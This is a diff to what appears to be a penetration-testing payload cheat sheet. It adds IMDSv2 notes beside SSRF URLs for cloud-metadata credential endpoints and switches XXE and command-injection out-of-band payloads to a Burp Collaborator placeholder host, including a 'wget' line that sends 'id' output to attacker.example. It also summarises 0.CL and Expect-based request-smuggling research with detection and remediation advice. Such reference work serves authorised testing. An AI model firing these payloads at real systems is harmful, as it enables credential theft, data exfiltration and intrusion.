@@ -86,6 +86,13 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
 http://169.254.169.254/latest/user-data/
 http://169.254.169.254/latest/dynamic/instance-identity/document
 
+# AWS IMDSv2 -- instance requires session tokens; the IMDSv1 GETs above return 401.
+# The SSRF must control the HTTP method and request headers (AWS docs flow):
+#   1) PUT /latest/api/token                          + X-aws-ec2-metadata-token-ttl-seconds: 21600  -> token in body
+#   2) GET /latest/meta-data/iam/security-credentials/ + X-aws-ec2-metadata-token: <token>
+# GET-only or header-less SSRF cannot reach IMDSv2. A PUT response hop limit of 1 also keeps
+# the token from reaching a client one network hop further away (e.g. a container).
+
 # GCP
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 # Header: Metadata-Flavor: Google
@@ -186,9 +193,10 @@ SeLeCt * FrOm uSeRs                -- case variation
 ### Blind OOB via HTTP (DNS confirmation)
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLAB.oastify.com/xxe">]>
 <foo>&xxe;</foo>
 ```
+`COLLAB.oastify.com` = your Burp Collaborator payload host (`*.oastify.com` since Burp 2022.3; `burpcollaborator.net` is widely blocked) or an interactsh host.
 
 ### Blind OOB via DNS + Data Exfil
 ```xml
@@ -342,10 +350,10 @@ $(sleep 5)
 
 ### Blind OOB (out-of-band confirmation)
 ```bash
-; curl https://attacker.burpcollaborator.net
-; nslookup attacker.burpcollaborator.net
-$(nslookup attacker.burpcollaborator.net)
-`ping -c 1 attacker.burpcollaborator.net`
+; curl https://COLLAB.oastify.com
+; nslookup COLLAB.oastify.com
+$(nslookup COLLAB.oastify.com)
+`ping -c 1 COLLAB.oastify.com`
 ; wget https://attacker.example/$(id|base64)
 ```
 
@@ -504,6 +512,13 @@ Transfer-Encoding
 3. All four probe types automatically sent
 4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
 ```
+
+### 0.CL and Expect-based desync (Kettle, Aug 2025)
+Source: James Kettle, "HTTP/1.1 must die: the desync endgame" (published 2025-08-06, updated 2025-10-17), https://portswigger.net/research/http1-must-die
+- **0.CL**: the front-end does not see an (obfuscated) `Content-Length` and forwards the headers only; the back-end honours it and waits for a body that never arrives, so the upstream connection deadlocks. Escaping needs an **early-response gadget**, an endpoint the back-end answers before reading the body: e.g. `/con` on IIS, server-level redirects, static files on nginx (Kettle found no viable gadget on Apache). A double desync then converts 0.CL into CL.0, which can affect other users' requests.
+- **Expect-based**: `Expect: 100-continue` splits a request into two steps. Front-end/back-end disagreement over that handshake, with a plain or obfuscated `Expect` header, produced both 0.CL and CL.0 desyncs on large CDNs and can expose a second response-header block past header stripping.
+- **Detection**: HTTP Request Smuggler **v3.0** (parser-discrepancy analysis: compares responses to obfuscated header variants, classed V-H / H-V); Turbo Intruder's `0cl-find-offset` script finds the injected-header length during confirmation. Confirm against your own follow-up requests only, never by poisoning live user traffic.
+- **Remediation to recommend**: HTTP/2 end-to-end (no HTTP/1.1 downgrade upstream); on AWS ALB set `routing.http.desync_mitigation_mode` to `strictest` and enable `routing.http.drop_invalid_header_fields.enabled`.
 
 ### Impact Chain
 ```
